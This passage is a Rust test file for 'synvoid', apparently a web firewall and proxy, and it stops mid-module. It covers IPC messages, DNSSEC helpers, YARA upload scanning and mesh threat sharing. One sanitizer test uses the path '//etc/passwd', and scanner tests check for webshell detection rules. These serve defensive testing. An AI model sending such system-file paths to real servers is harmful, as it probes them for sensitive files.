use std::path::PathBuf;
use synvoid::process::WorkerId;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_process_message_types() {
        use synvoid::process::{ErrorCode, ErrorSeverity, Message, WorkerId};

        let worker_started = Message::WorkerStarted {
            id: WorkerId(1),
            pid: 1234,
            port: 8080,
            timestamp: 1234567890,
        };

        assert!(matches!(worker_started, Message::WorkerStarted { .. }));

        let worker_ready = Message::WorkerReady { id: WorkerId(1) };
        assert!(matches!(worker_ready, Message::WorkerReady { .. }));

        let worker_error = Message::WorkerError {
            id: WorkerId(1),
            error: "test error".to_string(),
            severity: ErrorSeverity::Warning,
            error_code: ErrorCode::Unknown,
        };
        assert!(matches!(worker_error, Message::WorkerError { .. }));
    }

    #[test]
    fn test_worker_id_serialization() {
        use synvoid::process::WorkerId;

        let id = WorkerId(42);
        assert_eq!(id.as_usize(), 42);
    }

    #[tokio::test]
    async fn test_drain_state_transitions() {
        use synvoid::worker::drain_state::WorkerDrainState;

        let state = WorkerDrainState::new();

        assert!(!state.is_draining());

        state.start_drain(1).await;
        assert!(state.is_draining());

        let drain_id_value = state.get_drain_id();
        assert!(drain_id_value > 0);
    }

    #[test]
    fn test_ipc_socket_path_generation() {
        use synvoid::process::socket_path::{
            get_supervisor_socket_path, get_versioned_supervisor_socket_path,
        };

        let socket_path = get_supervisor_socket_path();
        assert!(socket_path.to_string_lossy().contains("supervisor"));

        let versioned = get_versioned_supervisor_socket_path(1);
        assert!(versioned.to_string_lossy().contains("supervisor"));
        assert!(versioned.to_string_lossy().contains("1"));
    }

    #[test]
    fn test_process_manager_config() {
        use synvoid::process::manager::ProcessManagerConfig;

        let config = ProcessManagerConfig {
            min_workers: 2,
            max_workers: 4,
            unified_server_workers: 1,
            max_restart_attempts: 3,
            restart_cooldown_secs: 2,
            restart_backoff_max_secs: 30,
            heartbeat_timeout_secs: 30,
            graceful_shutdown_timeout_secs: 60,
            worker_port_base: 8000,
            config_path: PathBuf::from("/test/config"),
            supervisor_socket_path: PathBuf::from("/test/socket"),
            log_level: Some("info".to_string()),
            pre_spawn_workers: 1,
            warm_workers_target: 2,
            health_check_interval_secs: 5,
            control_api_addr: "127.0.0.1:50051".to_string(),
            control_api_tls: None,
            ipc_session_key: None,
            ipc_enforce_signing: false,
            ipc_rate_limit: Default::default(),
            allow_insecure_ipc_key: false,
        };

        assert_eq!(config.min_workers, 2);
        assert_eq!(config.max_workers, 4);
    }

    #[test]
    fn test_ipc_message_serialization() {
        use synvoid::process::Message;

        let worker_started = Message::WorkerStarted {
            id: WorkerId(1),
            pid: 1234,
            port: 8080,
            timestamp: 1234567890,
        };

        let serialized = serde_json::to_string(&worker_started).unwrap();
        assert!(serialized.contains("WorkerStarted"));
        assert!(serialized.contains("1234"));

        let deserialized: Message = serde_json::from_str(&serialized).unwrap();
        assert!(matches!(
            deserialized,
            Message::WorkerStarted { pid: 1234, .. }
        ));
    }

    #[test]
    fn test_heartbeat_message() {
        use synvoid::process::{Message, WorkerId};

        let heartbeat = Message::WorkerHeartbeat {
            id: WorkerId(1),
            timestamp: 1234567890,
            metrics: Default::default(),
        };

        assert!(matches!(heartbeat, Message::WorkerHeartbeat { .. }));

        let serialized = serde_json::to_string(&heartbeat).unwrap();
        assert!(serialized.contains("WorkerHeartbeat"));
    }

    #[test]
    fn test_request_log_message() {
        use synvoid::process::{Message, RequestLogPayload, WorkerId};

        let request_log = Message::WorkerRequestLog {
            id: WorkerId(1),
            log: RequestLogPayload {
                timestamp: 1234567890,
                client_ip: "192.168.1.1".to_string(),
                method: "GET".to_string(),
                path: "/test".to_string(),
                status: 200,
                response_time_ms: 50,
                site_id: "site1".to_string(),
                user_agent: Some("Mozilla/5.0".to_string()),
                bytes_sent: 1024,
                bytes_received: 0,
            },
        };

        assert!(matches!(request_log, Message::WorkerRequestLog { .. }));

        let serialized = serde_json::to_string(&request_log).unwrap();
        assert!(serialized.contains("WorkerRequestLog"));
        assert!(serialized.contains("192.168.1.1"));
        assert!(serialized.contains("GET"));
        assert!(serialized.contains("/test"));

        let deserialized: Message = serde_json::from_str(&serialized).unwrap();
        assert!(matches!(
            deserialized,
            Message::WorkerRequestLog { log: log_payload, .. } if log_payload.status == 200
        ));
    }

    #[test]
    fn test_request_log_payload_default() {
        use synvoid::process::RequestLogPayload;

        let payload = RequestLogPayload {
            timestamp: 1234567890,
            client_ip: "10.0.0.1".to_string(),
            method: "POST".to_string(),
            path: "/api/data".to_string(),
            status: 404,
            response_time_ms: 100,
            site_id: "test_site".to_string(),
            user_agent: None,
            bytes_sent: 500,
            bytes_received: 200,
        };

        assert_eq!(payload.client_ip, "10.0.0.1");
        assert_eq!(payload.method, "POST");
        assert_eq!(payload.status, 404);
    }

    #[test]
    fn test_shutdown_messages() {
        use synvoid::process::Message;

        let graceful_shutdown = Message::MasterShutdown {
            graceful: true,
            timeout_secs: 60,
        };

        assert!(matches!(
            graceful_shutdown,
            Message::MasterShutdown { graceful: true, .. }
        ));

        let shutdown_complete = Message::WorkerShutdownComplete {
            id: synvoid::process::WorkerId(1),
        };

        assert!(matches!(
            shutdown_complete,
            Message::WorkerShutdownComplete { .. }
        ));
    }

    #[test]
    fn test_config_reload_message() {
        use synvoid::process::Message;

        let reload = Message::MasterConfigReload {
            config_path: "/etc/synvoid/main.toml".to_string(),
        };

        assert!(matches!(reload, Message::MasterConfigReload { .. }));
        if let Message::MasterConfigReload { config_path } = reload {
            assert!(config_path.contains("synvoid"));
        }
    }

    #[test]
    fn test_drain_manager_basic() {
        use synvoid::supervisor::drain_manager::DrainManager;

        let manager = DrainManager::new(100);

        let drain_id = manager.start_drain(60);
        assert!(drain_id > 0);

        let status = manager.get_drain_status();
        assert!(status.drain_id > 0);
    }

    #[test]
    fn test_verbose_request_logging_config() {
        use synvoid::config::logging::VerboseRequestLoggingConfig;

        let config = VerboseRequestLoggingConfig {
            enabled: true,
            log_blocked: true,
            log_challenged: true,
            log_dropped: true,
            log_proxied: false,
            log_internal: false,
            max_logs_per_second: 50,
        };

        assert!(config.enabled);
        assert!(config.log_blocked);
        assert!(config.log_challenged);
        assert!(config.log_dropped);
        assert!(!config.log_proxied);
        assert!(!config.log_internal);
        assert_eq!(config.max_logs_per_second, 50);
    }

    #[test]
    fn test_verbose_request_logging_config_defaults() {
        use synvoid::config::logging::VerboseRequestLoggingConfig;

        let config = VerboseRequestLoggingConfig::default();

        assert!(!config.enabled);
        assert!(!config.log_blocked);
        assert!(!config.log_challenged);
        assert!(!config.log_dropped);
        assert!(!config.log_proxied);
        assert!(!config.log_internal);
        assert_eq!(config.max_logs_per_second, 100);
    }

    #[allow(dead_code)]
    mod waf_body_inspection_tests {
        use synvoid::proxy::{
            build_headers_to_filter, sanitize_request_path, MAX_XFF_CHAIN_LENGTH,
        };

        #[test]
        fn test_sanitize_request_path_fast_path() {
            assert_eq!(sanitize_request_path("/api/users"), "/api/users");
            assert_eq!(
                sanitize_request_path("/static/css/style.css"),
                "/static/css/style.css"
            );
            assert_eq!(sanitize_request_path("/api/v1/items"), "/api/v1/items");
        }

        #[test]
        fn test_sanitize_request_path_double_slash() {
            assert_eq!(sanitize_request_path("//etc/passwd"), "/etc/passwd");
            assert_eq!(sanitize_request_path("/api//users"), "/api/users");
        }

        #[test]
        fn test_sanitize_request_path_empty() {
            assert_eq!(sanitize_request_path(""), "");
        }

        #[test]
        fn test_build_headers_to_filter_default() {
            let global = vec![];
            let site = vec![];
            let result = build_headers_to_filter(&global, &site);
            assert!(result.contains("x-forwarded-for"));
            assert!(result.contains("x-real-ip"));
        }

        #[test]
        fn test_build_headers_to_filter_custom() {
            let global = vec!["X-Custom-Global".to_string()];
            let site = vec!["X-Custom-Site".to_string()];
            let result = build_headers_to_filter(&global, &site);
            assert!(result.contains("x-custom-global"));
            assert!(result.contains("x-custom-site"));
        }

        #[test]
        fn test_max_xff_chain_length_constant() {
            assert_eq!(MAX_XFF_CHAIN_LENGTH, 10);
        }
    }

    #[allow(dead_code)]
    mod dnssec_validation_tests {
        use synvoid::dns::dnssec_validation::{
            calculate_key_tag, canonical_dns_message, canonical_name, canonical_rdata,
            compute_dnskey_canonical, compute_ds_digest, count_labels,
        };

        #[test]
        fn test_calculate_key_tag_rfc4034_compliant() {
            let flags: u16 = 257;
            let protocol: u8 = 3;
            let algorithm: u8 = 8;
            let public_key = [
                0x04, 0xB3, 0x9A, 0x17, 0xE5, 0x79, 0x80, 0x55, 0x7B, 0x16, 0x89, 0xD0, 0xC1, 0x5F,
                0x6F, 0x94, 0x62, 0x52, 0x9A, 0xE6, 0xF5, 0x65, 0x7A, 0x33, 0x4E, 0x75, 0xB7, 0xDF,
                0xD0, 0x86, 0x58, 0x32, 0x84, 0x36, 0xEB, 0x24, 0xC5, 0x3B, 0xDB, 0x50, 0x4D, 0x5D,
                0x33, 0x63, 0xE0, 0xAE, 0x12, 0x71, 0x88, 0x7A, 0x41, 0xF0, 0x6C, 0xF5, 0x88, 0xE2,
                0x1C, 0x8B, 0x4D, 0xAF, 0x4E, 0x89, 0x34, 0xB3, 0x6B, 0xAF, 0x4D, 0x5A, 0x3C, 0x50,
                0x53, 0x1E, 0xE0, 0x6E, 0x0E, 0xB9, 0xE2, 0x2A, 0xEB, 0xCF, 0x6A, 0x34, 0x9F, 0xA9,
                0x8B, 0xC9, 0xFE, 0x37, 0xC6, 0xB9, 0x46, 0x97, 0x9B, 0xDE, 0xE7, 0xB2, 0x14, 0xF6,
                0x4E, 0x22, 0x04, 0xF7, 0x7D, 0xAD, 0x72, 0x0B, 0x53, 0x01, 0xAF, 0xC4, 0xA3, 0x78,
                0xD9, 0x5F, 0x0E, 0xE7, 0xED, 0xAC, 0x15, 0xA3, 0xFC, 0x08, 0xA2, 0x50, 0x02, 0x43,
                0x04, 0x5C, 0x47, 0xE9, 0xD0, 0x38, 0xE2, 0xE7, 0x93, 0x5F, 0x5B, 0x9A, 0xD2, 0xD4,
                0x4D, 0x40, 0x0E, 0xA0, 0x6E, 0x57, 0xF6, 0x36, 0xC8, 0xB4, 0x27, 0xB5, 0x20, 0x62,
                0x00, 0x6E, 0x4C, 0x6D, 0x7B, 0x82, 0xF0, 0xD2, 0x03, 0x0B, 0xB5, 0x54, 0x0E, 0x1F,
                0x6B, 0xB0, 0x90, 0x5F, 0x08, 0x17, 0x7F, 0x0C, 0x8A, 0x6A, 0xC7, 0x9E, 0xD4, 0x47,
                0x7D, 0x6A, 0x2C, 0x6D, 0xCA, 0xFE, 0x78, 0x1F, 0xDA, 0xC5,
            ];

            let key_tag = calculate_key_tag(flags, protocol, algorithm, &public_key);
            assert_eq!(key_tag, 19072);
        }

        #[test]
        fn test_calculate_key_tag_zsk() {
            let flags: u16 = 256;
            let protocol: u8 = 3;
            let algorithm: u8 = 8;
            let public_key = [0xAA; 32];

            let key_tag = calculate_key_tag(flags, protocol, algorithm, &public_key);
            assert!(key_tag > 0);
        }

        #[test]
        fn test_canonical_name_simple() {
            let result = canonical_name("example.com");
            assert_eq!(
                result,
                vec![7, 101, 120, 97, 109, 112, 108, 101, 3, 99, 111, 109, 0]
            );
        }

        #[test]
        fn test_canonical_name_lowercase() {
            let upper = canonical_name("EXAMPLE.COM");
            let lower = canonical_name("example.com");
            assert_eq!(upper, lower);
        }

        #[test]
        fn test_canonical_name_trailing_dot() {
            let with_dot = canonical_name("example.com.");
            let without = canonical_name("example.com");
            assert_eq!(with_dot, without);
        }

        #[test]
        fn test_canonical_name_empty() {
            let result = canonical_name("");
            assert_eq!(result, vec![0]);
        }

        #[test]
        fn test_count_labels() {
            assert_eq!(count_labels("com"), 1);
            assert_eq!(count_labels("example.com"), 2);
            assert_eq!(count_labels("www.example.com"), 3);
            assert_eq!(count_labels(""), 1);
        }

        #[test]
        fn test_canonical_rdata_a_record() {
            let result = canonical_rdata(1, "192.168.1.1", None, None, None, 300);
            assert_eq!(result, vec![192, 168, 1, 1]);
        }

        #[test]
        fn test_canonical_rdata_aaaa_record() {
            let result = canonical_rdata(28, "::1", None, None, None, 300);
            assert_eq!(result, vec![0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]);
        }

        #[test]
        fn test_canonical_rdata_ns_record() {
            let result = canonical_rdata(2, "ns1.example.com", None, None, None, 300);
            let expected = canonical_name("ns1.example.com");
            assert_eq!(result, expected);
        }

        #[test]
        fn test_canonical_rdata_txt_record() {
            let result = canonical_rdata(
                16,
                "v=spf1 include:_spf.example.com ~all",
                None,
                None,
                None,
                300,
            );
            assert!(!result.is_empty());
        }

        #[test]
        fn test_compute_dnskey_canonical() {
            let flags: u16 = 257;
            let protocol: u8 = 3;
            let algorithm: u8 = 8;
            let public_key = [0xAA; 32];

            let result = compute_dnskey_canonical(flags, protocol, algorithm, &public_key);
            assert_eq!(result.len(), 4 + public_key.len());
            assert_eq!(&result[0..2], &flags.to_be_bytes());
            assert_eq!(result[2], protocol);
            assert_eq!(result[3], algorithm);
        }

        #[test]
        fn test_compute_ds_digest_sha1() {
            let digest = compute_ds_digest(1, 257, 3, 8, &[0xAA; 32]);
            assert!(digest.is_ok());
            assert_eq!(digest.unwrap().len(), 20);
        }

        #[test]
        fn test_compute_ds_digest_sha256() {
            let digest = compute_ds_digest(2, 257, 3, 8, &[0xAA; 32]);
            assert!(digest.is_ok());
            assert_eq!(digest.unwrap().len(), 32);
        }

        #[test]
        fn test_compute_ds_digest_sha384() {
            let digest = compute_ds_digest(4, 257, 3, 8, &[0xAA; 32]);
            assert!(digest.is_ok());
            assert_eq!(digest.unwrap().len(), 48);
        }

        #[test]
        fn test_compute_ds_digest_unsupported() {
            let digest = compute_ds_digest(3, 257, 3, 8, &[0xAA; 32]);
            assert!(digest.is_err());
        }

        #[test]
        fn test_canonical_dns_message() {
            let rdata = vec![192, 168, 1, 1];
            let msg = canonical_dns_message("example.com", 1, 1, 300, &rdata);

            let expected_name = canonical_name("example.com");
            assert!(msg.starts_with(&expected_name));
        }
    }

    #[allow(dead_code)]
    mod upload_scanning_tests {
        use synvoid::upload::yara_scanner::{DEFAULT_MALWARE_RULES, NO_EXCLUDED_CATEGORIES};

        #[test]
        fn test_no_excluded_categories_is_empty() {
            assert!(NO_EXCLUDED_CATEGORIES.is_empty());
        }

        #[test]
        fn test_default_malware_rules_contains_executable_rules() {
            assert!(DEFAULT_MALWARE_RULES.contains("executable_pe"));
            assert!(DEFAULT_MALWARE_RULES.contains("MZ"));
        }

        #[test]
        fn test_default_malware_rules_contains_webshell_detection() {
            assert!(DEFAULT_MALWARE_RULES.contains("php_webshell"));
        }
    }

    #[allow(dead_code)]
    mod mesh_threat_propagation_tests {
        use synvoid::mesh::protocol::ThreatSeverity;
        use synvoid::mesh::threat_intel::ThreatIntelligenceConfig;

        #[test]
        fn test_threat_severity_ordering() {
            assert!(ThreatSeverity::Critical as u8 > ThreatSeverity::High as u8);
            assert!(ThreatSeverity::High as u8 > ThreatSeverity::Medium as u8);
            assert!(ThreatSeverity::Medium as u8 > ThreatSeverity::Low as u8);
        }

        #[test]
        fn test_threat_type_variants() {
            use synvoid::mesh::protocol::ThreatType;
            let variants = [
                ThreatType::IpBlock,
                ThreatType::IpThrottle,
                ThreatType::AsnBlock,
                ThreatType::DomainBlock,
                ThreatType::UrlBlock,
                ThreatType::CertBlock,
            ];
            assert_eq!(variants.len(), 6);
        }

        #[test]
        fn test_threat_intel_config_defaults() {
            let config = ThreatIntelligenceConfig::default();
            assert!(config.enabled);
            assert!(config.push_enabled);
            assert!(config.sync_enabled);
            assert_eq!(config.sync_interval_secs, 300);
            assert!(!config.hub_only_mode);
        }

        #[test]
        fn test_threat_intel_config_hub_only() {
            let config = ThreatIntelligenceConfig {
                hub_only_mode: true,
                behavioral_enabled: false,
                min_samples_for_fingerprint: 10,
                fingerprint_ttl_secs: 3600,
                high_severity_threshold: 70,
                ..Default::default()
            };
            assert!(config.hub_only_mode);
        }
    }

    #[allow(dead_code)]
    mod honeypot_mesh_flow_tests {
        use synvoid::mesh::config::MeshNodeRole;

        #[test]
        fn test_mesh_node_role_is_global() {
            assert!(MeshNodeRole::GLOBAL.is_global());
            assert!(!MeshNodeRole::EDGE.is_global());
            assert!(!MeshNodeRole::ORIGIN.is_global());

            let global_edge = MeshNodeRole::GLOBAL | MeshNodeRole::EDGE;
            assert!(global_edge.is_global());
        }

        #[test]
        fn test_mesh_node_role_combinations() {
            let global_edge = MeshNodeRole::GLOBAL | MeshNodeRole::EDGE;
            assert!(global_edge.contains(MeshNodeRole::GLOBAL));
            assert!(global_edge.contains(MeshNodeRole::EDGE));
        }
    }

    #[allow(dead_code)]
    mod yara_mesh_distribution_tests {
        use synvoid::mesh::yara_rules::{
            BroadcastAckStatus, BroadcastAckTracker, RuleChangeTracker,
        };

        #[test]
        fn test_broadcast_ack_tracker_new() {
            let tracker = BroadcastAckTracker::new(
                "req-123".to_string(),
                vec!["peer1".to_string(), "peer2".to_string()],
            );
            assert_eq!(tracker.request_id, "req-123");
            assert_eq!(tracker.sent_peers.len(), 2);
            assert_eq!(tracker.acked_peers.len(), 0);
            assert_eq!(tracker.failed_peers.len(), 0);
            assert!(tracker.completed_at.is_none());
        }

        #[test]
        fn test_broadcast_ack_tracker_record_ack() {
            let mut tracker = BroadcastAckTracker::new(
                "req-123".to_string(),
                vec!["peer1".to_string(), "peer2".to_string()],
            );
            tracker.record_ack("peer1");
            assert_eq!(tracker.acked_peers.len(), 1);
            assert!(!tracker.is_complete());
        }

        #[test]
        fn test_broadcast_ack_tracker_record_failure() {
            let mut tracker = BroadcastAckTracker::new(
                "req-123".to_string(),
                vec!["peer1".to_string(), "peer2".to_string()],
            );
            tracker.record_failure("peer2");
            assert_eq!(tracker.failed_peers.len(), 1);
            assert!(!tracker.is_complete());
        }

        #[test]
        fn test_broadcast_ack_tracker_is_complete() {
            let mut tracker =
                BroadcastAckTracker::new("req-123".to_string(), vec!["peer1".to_string()]);
            tracker.record_ack("peer1");
            assert!(tracker.is_complete());
            assert!(tracker.completed_at.is_some());
        }

        #[test]
        fn test_broadcast_ack_tracker_pending_count() {
            let mut tracker = BroadcastAckTracker::new(
                "req-123".to_string(),
                vec![
                    "peer1".to_string(),
                    "peer2".to_string(),
                    "peer3".to_string(),
                ],
            );
            tracker.record_ack("peer1");
            assert_eq!(tracker.pending_count(), 2);
        }

        #[test]
        fn test_broadcast_ack_tracker_ack_rate() {
            let mut tracker = BroadcastAckTracker::new(
                "req-123".to_string(),
                vec![
                    "peer1".to_string(),
                    "peer2".to_string(),
                    "peer3".to_string(),
                    "peer4".to_string(),
                ],
            );
            tracker.record_ack("peer1");
            tracker.record_ack("peer2");
            tracker.record_failure("peer3");
            assert_eq!(tracker.ack_rate(), 0.5);
        }

        #[test]
        fn test_broadcast_ack_tracker_ack_rate_empty() {
            let tracker = BroadcastAckTracker::new("req-123".to_string(), vec![]);
            assert_eq!(tracker.ack_rate(), 1.0);
        }

        #[test]
        fn test_rule_change_tracker_default() {
            let tracker = RuleChangeTracker::default();
            assert!(tracker.last_version.is_none());
            assert!(tracker.last_full_sync.is_some());
            assert_eq!(tracker.changes_since_full, 0);
            assert!(tracker.incremental_versions.is_empty());
        }

        #[test]
        fn test_rule_change_tracker_record_change() {
            let mut tracker = RuleChangeTracker::default();
            tracker.record_change("v1.0");
            assert_eq!(tracker.last_version, Some("v1.0".to_string()));
            assert_eq!(tracker.changes_since_full, 1);
        }

        #[test]
        fn test_broadcast_ack_status() {
            let status = BroadcastAckStatus {
                request_id: "req-123".to_string(),
                total_peers: 5,
                acked_count: 3,
                pending_count: 1,
                failed_count: 1,
                ack_rate: 0.6,
                duration_secs: 1.5,
                is_complete: false,
            };
            assert_eq!(status.request_id, "req-123");
            assert_eq!(status.total_peers, 5);
        }
    }

    #[test]
    fn test_worker_metrics_default() {
        use synvoid::worker::metrics::WorkerMetrics;

        let metrics = WorkerMetrics::default();

        assert_eq!(
            metrics
                .total_requests
                .load(std::sync::atomic::Ordering::Relaxed),
            0
        );
        assert_eq!(
            metrics
                .current_concurrent
                .load(std::sync::atomic::Ordering::Relaxed),
            0
        );
    }

    #[test]
    fn test_worker_metrics_recording() {
        use std::sync::atomic::Ordering;
        use synvoid::worker::metrics::WorkerMetrics;

        let metrics = WorkerMetrics::default();

        metrics.total_requests.fetch_add(1, Ordering::Relaxed);
        assert_eq!(metrics.total_requests.load(Ordering::Relaxed), 1);

        metrics.current_concurrent.fetch_add(1, Ordering::Relaxed);
        assert_eq!(metrics.current_concurrent.load(Ordering::Relaxed), 1);

        metrics.current_concurrent.fetch_sub(1, Ordering::Relaxed);
        assert_eq!(metrics.current_concurrent.load(Ordering::Relaxed), 0);
    }
}

#[cfg(test)]
mod worker_crash_recovery_tests {
    use synvoid::platform::SocketHandoffError;
    use synvoid::process::ipc::MessageCategory;
    use synvoid::process::{ErrorCode, ErrorSeverity, Message, WorkerId};

    #[test]
    fn test_worker_crash_error_message() {
        let crash_error = Message::WorkerError {
            id: WorkerId(2),
            error: "worker panicked: segment fault".to_string(),
            severity: ErrorSeverity::Critical,
            error_code: ErrorCode::WorkerPanic,
        };

        assert!(matches!(
            crash_error,
            Message::WorkerError {
                severity: ErrorSeverity::Critical,
                ..
            }
        ));
        if let Message::WorkerError {
            id,
            error,
            severity,
            error_code,
        } = crash_error
        {
            assert_eq!(id, WorkerId(2));
            assert!(error.contains("panicked"));
            assert_eq!(severity, ErrorSeverity::Critical);
            assert_eq!(error_code, ErrorCode::WorkerPanic);
        }
    }

    #[test]
    fn test_worker_crash_error_serialization() {
        let crash_error = Message::WorkerError {
            id: WorkerId(5),
            error: "segmentation fault".to_string(),
            severity: ErrorSeverity::Critical,
            error_code: ErrorCode::WorkerPanic,
        };

        let json = serde_json::to_string(&crash_error).unwrap();
        assert!(json.contains("WorkerError"));
        assert!(json.contains("segmentation fault"));
        assert!(json.contains("Critical"));

        let deserialized: Message = serde_json::from_str(&json).unwrap();
        match deserialized {
            Message::WorkerError {
                id,
                error,
                severity,
                error_code,
            } => {
                assert_eq!(id, WorkerId(5));
                assert_eq!(error, "segmentation fault");
                assert_eq!(severity, ErrorSeverity::Critical);
                assert_eq!(error_code, ErrorCode::WorkerPanic);
            }
            _ => panic!("expected WorkerError"),
        }
    }

    #[test]
    fn test_worker_crash_error_category() {
        let crash_error = Message::WorkerError {
            id: WorkerId(1),
            error: "crash".to_string(),
            severity: ErrorSeverity::Critical,
            error_code: ErrorCode::WorkerPanic,
        };

        assert_eq!(crash_error.category(), MessageCategory::WorkerLifecycle);
    }

    #[test]
    fn test_socket_handoff_request_message() {
        let handoff_req = Message::SocketHandoffRequest {
            socket_path: "/tmp/synvoid/socket-handoff.sock".to_string(),
        };

        assert!(matches!(handoff_req, Message::SocketHandoffRequest { .. }));
        if let Message::SocketHandoffRequest { socket_path } = &handoff_req {
            assert!(socket_path.contains("socket-handoff"));
        }
    }

    #[test]
    fn test_socket_handoff_ready_message() {
        let handoff_ready = Message::SocketHandoffReady {
            ports: vec![8080, 8443],
        };

        assert!(
            matches!(handoff_ready, Message::SocketHandoffReady { ports } if ports == vec![8080, 8443])
        );
    }

    #[test]
    fn test_socket_handoff_complete_message() {
        let handoff_complete = Message::SocketHandoffComplete {
            success: true,
            fd_count: 2,
        };

        assert!(matches!(
            handoff_complete,
            Message::SocketHandoffComplete {
                success: true,
                fd_count: 2
            }
        ));
    }

    #[test]
    fn test_socket_handoff_failed_message() {
        let handoff_failed = Message::SocketHandoffFailed {
            error: "connection reset by peer".to_string(),
        };

        assert!(matches!(
            handoff_failed,
            Message::SocketHandoffFailed { .. }
        ));
        if let Message::SocketHandoffFailed { error } = handoff_failed {
            assert!(error.contains("reset"));
        }
    }

    #[test]
    fn test_socket_handoff_error_types() {
        // TODO: feature removed — SocketHandoffError variants Timeout, InvalidState, Cancelled
        // no longer exist. The current enum has: CreateFailed, BindFailed, ListenFailed,
        // SetOptFailed, SendFailed, RecvFailed, NoSocketsReceived, TooManySockets,
        // NotConnected, NotSupported, IpcError.
        let not_supported = SocketHandoffError::NotSupported("test".to_string());
        assert!(not_supported.to_string().contains("not supported"));
    }

    #[test]
    fn test_worker_error_severity_levels() {
        use synvoid::process::ErrorSeverity;

        let warning = ErrorSeverity::Warning;
        let error = ErrorSeverity::Error;
        let critical = ErrorSeverity::Critical;

        assert_eq!(warning.to_string(), "warning");
        assert_eq!(error.to_string(), "error");
        assert_eq!(critical.to_string(), "critical");
    }

    #[test]
    fn test_worker_error_codes() {
        use synvoid::process::ErrorCode;

        assert_eq!(ErrorCode::WorkerPanic.to_string(), "worker_panic");
        assert_eq!(
            ErrorCode::ResourceExhausted.to_string(),
            "resource_exhausted"
        );
        assert_eq!(ErrorCode::Timeout.to_string(), "timeout");
        assert_eq!(
            ErrorCode::SocketBindFailed.to_string(),
            "socket_bind_failed"
        );
    }

    #[test]
    fn test_worker_crash_triggers_socket_handoff_flow() {
        let worker_id = WorkerId(3);

        let crash_error = Message::WorkerError {
            id: worker_id,
            error: "SIGSEGV: segmentation fault".to_string(),
            severity: ErrorSeverity::Critical,
            error_code: ErrorCode::WorkerPanic,
        };

        let socket_handoff_req = Message::SocketHandoffRequest {
            socket_path: "/tmp/synvoid/socket-handoff.sock".to_string(),
        };

        let socket_handoff_ready = Message::SocketHandoffReady {
            ports: vec![9000, 9443],
        };

        let socket_handoff_complete = Message::SocketHandoffComplete {
            success: true,
            fd_count: 2,
        };

        assert!(matches!(
            crash_error,
            Message::WorkerError {
                severity: ErrorSeverity::Critical,
                ..
            }
        ));
        assert!(matches!(
            socket_handoff_req,
            Message::SocketHandoffRequest { .. }
        ));
        assert!(matches!(
            socket_handoff_ready,
            Message::SocketHandoffReady { .. }
        ));
        assert!(matches!(
            socket_handoff_complete,
            Message::SocketHandoffComplete { success: true, .. }
        ));
    }

    #[test]
    fn test_crash_worker_id_tracking() {
        let id1 = WorkerId(0);
        let id2 = WorkerId(1);
        let id3 = WorkerId(2);

        assert_eq!(id1.as_usize(), 0);
        assert_eq!(id2.as_usize(), 1);
        assert_eq!(id3.as_usize(), 2);

        assert_ne!(id1, id2);
        assert_ne!(id2, id3);
    }

    #[test]
    fn test_worker_status_enum() {
        use synvoid::process::WorkerStatus;

        let starting = WorkerStatus::Starting;
        let ready = WorkerStatus::Ready;
        let running = WorkerStatus::Running;
        let stopping = WorkerStatus::Stopping;
        let stopped = WorkerStatus::Stopped;
        let failed = WorkerStatus::Failed;

        assert!(matches!(starting, WorkerStatus::Starting));
        assert!(matches!(ready, WorkerStatus::Ready));
        assert!(matches!(running, WorkerStatus::Running));
        assert!(matches!(stopping, WorkerStatus::Stopping));
        assert!(matches!(stopped, WorkerStatus::Stopped));
        assert!(matches!(failed, WorkerStatus::Failed));
    }

    #[test]
    fn test_restart_worker_flow() {
        let restart_req = Message::RestartWorkerRequest { id: WorkerId(2) };
        assert!(matches!(restart_req, Message::RestartWorkerRequest { .. }));

        if let Message::RestartWorkerRequest { id } = restart_req {
            assert_eq!(id, WorkerId(2));
        }

        let restart_resp = Message::RestartWorkerResponse {
            id: WorkerId(2),
            success: true,
            error: None,
        };
        assert!(matches!(
            restart_resp,
            Message::RestartWorkerResponse { success: true, .. }
        ));

        let restart_failed = Message::RestartWorkerResponse {
            id: WorkerId(2),
            success: false,
            error: Some("worker limit reached".to_string()),
        };
        assert!(matches!(
            restart_failed,
            Message::RestartWorkerResponse { success: false, .. }
        ));
    }
}

#[cfg(test)]
mod mesh_transport_tests {
    use synvoid::mesh::transport_core::{
        MeshTransportError, MAX_REASONABLE_TIMESTAMP, MIN_REASONABLE_TIMESTAMP,
    };

    #[test]
    fn test_mesh_transport_error_display() {
        let error = MeshTransportError::NoSeedsAvailable;
        assert_eq!(error.to_string(), "No seed nodes available");

        let error = MeshTransportError::ConnectionFailed("test".to_string());
        assert_eq!(error.to_string(), "Connection failed: test");

        let error = MeshTransportError::VersionMismatch {
            expected: 1,
            got: 2,
        };
        assert_eq!(error.to_string(), "Version mismatch: expected 1, got 2");

        let error = MeshTransportError::Timeout;
        assert_eq!(error.to_string(), "Timeout");

        let error = MeshTransportError::RateLimited;
        assert_eq!(
            error.to_string(),
            "Rate limited - too many connection attempts"
        );
    }

    #[test]
    fn test_mesh_transport_error_from_quinn() {
        let error = MeshTransportError::from(quinn::ConnectionError::TimedOut);
        assert!(matches!(error, MeshTransportError::ConnectionFailed(_)));
    }

    #[test]
    fn test_timestamp_constants() {
        const {
            assert!(MIN_REASONABLE_TIMESTAMP > 0);
            assert!(MAX_REASONABLE_TIMESTAMP > MIN_REASONABLE_TIMESTAMP);
            assert!(
                MAX_REASONABLE_TIMESTAMP - MIN_REASONABLE_TIMESTAMP >= 31536000,
                "Timestamp window should be at least 1 year"
            );
        }
    }

    #[test]
    fn test_mesh_transport_error_variants() {
        let variants = vec![
            MeshTransportError::NoSeedsAvailable,
            MeshTransportError::ConnectionFailed("test".to_string()),
            MeshTransportError::SendFailed("test".to_string()),
            MeshTransportError::ReceiveFailed("test".to_string()),
            MeshTransportError::VersionMismatch {
                expected: 1,
                got: 2,
            },
            MeshTransportError::UnexpectedMessage,
            MeshTransportError::PeerError {
                code: 404,
                message: "Not found".to_string(),
            },
            MeshTransportError::PeerNotFound("peer1".to_string()),
            MeshTransportError::NoRouteToUpstream("upstream1".to_string()),
            MeshTransportError::ServiceNotAllowed("service1".to_string()),
            MeshTransportError::RuntimeNotSet,
            MeshTransportError::Timeout,
            MeshTransportError::RateLimited,
            MeshTransportError::AuthFailed("auth error".to_string()),
        ];

        assert_eq!(variants.len(), 14);
    }
}

#[cfg(test)]
mod rate_limit_tests {
    use synvoid::utils::ratelimit::{IpRateLimiter, RateLimitResult, RateLimitStatsProvider};
